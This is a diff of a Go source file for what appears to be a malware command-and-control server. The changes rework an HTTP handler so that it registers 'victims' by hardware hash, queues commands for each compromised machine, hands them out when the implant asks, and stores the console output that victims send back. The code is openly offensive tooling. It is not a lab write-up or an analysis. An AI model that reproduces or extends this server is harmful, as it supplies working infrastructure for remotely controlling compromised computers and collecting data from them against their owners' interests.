@@ -1,20 +1,11 @@
 package main
 
 import (
-	//"bufio"
-	//"bytes"
-	//"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
-	"sync"
-
-	rbt "github.com/emirpasic/gods/trees/redblacktree"
 )
-
-var superCatTree = rbt.NewWithStringComparator() // key: hash, value: []IncomingSuperCatData
-var superCatMutex sync.Mutex
 
 // runs in a goroutine
 func startServer() {
@@ -33,77 +24,32 @@ func proxyHandler(w http.ResponseWriter, r *http.Request) {
 
 	fmt.Println("Message recieved from: ", r.Host)
 
-	queries := r.URL.Query() //check for incoming url queries
-
 	//read the message received to our side (should be none with GET)
 	message, err := io.ReadAll(r.Body)
 	if err != nil {
 		fmt.Println("There was an error: ", err)
 		return
 	}
-
-	hashVal := queries["DoesHashHaveMessages"]
-	//differentiate get vs post and send responses accordingly
-	//GET requests will be of form ?Key=value wherein Key should be DoesHashHaveMessages
-	//and the value is a hash to check to see if it has messages respond true if it does false otherwise
-	//testing information
-	//curl 127.0.0.1:8888?DoesHashHaveMessages="replace me and " char with your hash"
-	if r.Method == http.MethodGet {
-		// Respond to a GET request
-
-		//check to see if hash queried has new messages to read
-
-		printlNDebug(("received GET value::" + hashVal[0]))
-
-		if DoesHashHaveMessages(hashVal[0]) {
-			fmt.Fprintln(w, "true")
-		} else {
-			fmt.Fprintln(w, "false")
-		}
-
-	} else if r.Method == http.MethodPost { //respond to post commands
-
-		incomingHeader := r.Header.Get("IncomingHeader")
-
-		switch incomingHeader {
-		case "NewClient": //just register the new victim in the lookup tree
-			registerNewClient(string(message))
-		case "IncomingSuperCatData": //reading in data here dont need to return
-			HandleIncomingCatData(string(message))
-		case "RequestCommand": //client is requesting its next command return that if possible otherwise send nil
-			if DoesHashHaveMessages(hashVal[0]) {
-				jsonData, err := json.Marshal(HashGetNextCommand(string(message)))
-				if err != nil {
-					fmt.Println("There was an error: ", err)
-					return
-				}
-				fmt.Fprintln(w, string(jsonData))
-			} else {
-				fmt.Fprintln(w, nil)
-
-			}
-
-			//add other cases here
-
-		}
-		println("this is a post request")
+	
+	//messages come in in the form need to separate them out 
+	// "jsonIdentifier{json data}"
+	designator, json, err := SeparateJsonDesignator(string(message))
+	if(err != nil) {
+		println("ERORR encountered could not separate strings correctly")
+		return
 	}
 
-	fmt.Println("Message: ", string(message))
-
-}
-
-// needs to be implemented
-// FREDY: I need this to return true if it finds that the incoming hash has messages that can be read from its individual queue
-func DoesHashHaveMessages(inputHash string) bool {
-	clientTreeMutex.Lock()
-	defer clientTreeMutex.Unlock()
-
-	if val, found := clientTree.Get(inputHash); found {
-		victim := val.(VictimInfo)
-		return len(victim.Commands) > 0
+	switch designator {
+	case "victimregister/json":
+		resp := RegisterNewVictim(json)
+		fmt.Fprintf(w, "%s" ,resp)
+	case "requestCommand/json":
+		resp := HandleIncomingRequest(json)
+		fmt.Fprintf(w, "%s", resp)
+	case "incomingData/json":
+		resp := HandleIncomingData(json)
+		fmt.Fprintf(w, "%s", resp)
 	}
-	return false
 }
 
 func HandleIncomingCatData(incomingSuperCatString string) {
@@ -147,20 +93,132 @@ func HandleIncomingCatData(incomingSuperCatString string) {
 
 }
 
-func HashGetNextCommand(incomingHash string) VictimCommand {
-	//for any given incoming hash get if possible the next command to run return this so it can be sent to the client
-	//
+func RegisterNewVictim(incomingJson string) (toReturn string){
 	clientTreeMutex.Lock()
 	defer clientTreeMutex.Unlock()
 
-	if val, found := clientTree.Get(incomingHash); found {
-		victim := val.(VictimInfo)
-		if len(victim.Commands) > 0 {
-			nextCmd := victim.Commands[0]
-			victim.Commands = victim.Commands[1:]
-			clientTree.Put(incomingHash, victim)
-			return nextCmd
-		}
+	//see if the incoming data is even valid
+	var newVictimInfo VictimRegister
+	err := json.Unmarshal([]byte(incomingJson), &newVictimInfo)
+	if (err != nil || newVictimInfo.HardwareHash == ""){
+		var Response AssimilateResponse
+		Response.ResponseCode   = 1
+		Response.ResponseString = "Failure"
+		jsonResponse, _ :=json.Marshal(Response)
+		return string(jsonResponse)
 	}
-	return VictimCommand{}
+
+	//see if the tree already has this entry
+	_, exists := clientTree.Get(newVictimInfo.HardwareHash);
+	if  (exists) {
+		var Response AssimilateResponse
+		Response.ResponseCode   = 1
+		Response.ResponseString = "Failure"
+		jsonResponse, _ :=json.Marshal(Response)
+		return string(jsonResponse)
+	}
+
+	//if it makes it here its valid return a success and put into the tree
+	victim := VictimInfo{
+		Commands:    		[]VictimCommand{},
+		VictimInfo:  		newVictimInfo,
+		VictimConsoleOutput: []string{},
+	}
+	clientTree.Put(newVictimInfo.HardwareHash, victim)
+
+	fmt.Println("Registered new client with hash:", newVictimInfo.HardwareHash)
+	return ""
+}
+
+func HandleIncomingRequest(incomingJson string) (toreturn string){
+	clientTreeMutex.Lock()
+	defer clientTreeMutex.Unlock()
+
+	println("handle incoming request")
+
+	//see if the incoming data is even valid json
+	var jsonIncomingRequest IncomingVictimRequest
+	err := json.Unmarshal([]byte(incomingJson), &jsonIncomingRequest)
+	if (err != nil || jsonIncomingRequest.HardwareHash == ""){
+		var Response AssimilateResponse
+		Response.ResponseCode   = 1
+		Response.ResponseString = "Failure"
+		jsonResponse, _ :=json.Marshal(Response)
+		return string(jsonResponse)
+	}
+
+	//see if the tree even has this entry
+	clientData, exists := clientTree.Get(jsonIncomingRequest.HardwareHash);
+	if  (!exists) { //if it does not exist 
+		var Response AssimilateResponse
+		Response.ResponseCode   = 1
+		Response.ResponseString = "Failure"
+		jsonResponse, _ :=json.Marshal(Response)
+		return string(jsonResponse)
+	}
+
+	//see if there are even any commands to run for the hash if so return that to the client
+	if (len(clientData.(VictimInfo).Commands) > 0){
+		currentData := clientData.(VictimInfo)
+		var poppedCommand = currentData.Commands[0]
+		currentData.Commands = currentData.Commands[1:]
+
+		//have to replace what was taken here
+		clientTree.Put(currentData.VictimInfo.HardwareHash, currentData)
+
+		toSend, _ := json.Marshal(poppedCommand)
+		println(toSend)
+		toSend = []byte("requestCommand/json" + string(toSend))
+		return string(toSend)
+
+	}else {
+		var Response AssimilateResponse
+		Response.ResponseCode   = 1
+		Response.ResponseString = "Failure"
+		jsonResponse, _ :=json.Marshal(Response)
+		return string(jsonResponse)
+	}
+
+}
+
+func HandleIncomingData(incomingJson string) (toreturn string){
+	clientTreeMutex.Lock()
+	defer clientTreeMutex.Unlock()
+
+	println("handle incoming datastream")
+
+	var jsonIncomingRequest VictimOutputFlow
+	err := json.Unmarshal([]byte(incomingJson), &jsonIncomingRequest)
+	if (err != nil || jsonIncomingRequest.HardwareHash == ""){
+		var Response AssimilateResponse
+		Response.ResponseCode   = 1
+		Response.ResponseString = "Failure"
+		jsonResponse, _ :=json.Marshal(Response)
+		return string(jsonResponse)
+	}
+
+	//see if the tree even has this entry before doing anything else
+	clientData, exists := clientTree.Get(jsonIncomingRequest.HardwareHash);
+	if  (!exists) { //if it does not exist 
+		var Response AssimilateResponse
+		Response.ResponseCode   = 1
+		Response.ResponseString = "Failure"
+		jsonResponse, _ :=json.Marshal(Response)
+		return string(jsonResponse)
+	}
+
+	//entry exists on the tree put a string on it
+	currentData := clientData.(VictimInfo)
+	currentData.VictimConsoleOutput = append(currentData.VictimConsoleOutput, jsonIncomingRequest.Data)
+
+	//have to replace what was taken here
+	clientTree.Put(currentData.VictimInfo.HardwareHash, currentData)
+
+	//in this this outcome is a success so return accordingly
+	var Response AssimilateResponse
+		Response.ResponseCode   = 0
+		Response.ResponseString = "Success"
+	toSend, _ := json.Marshal(Response)
+	return string(toSend)
+	
 }
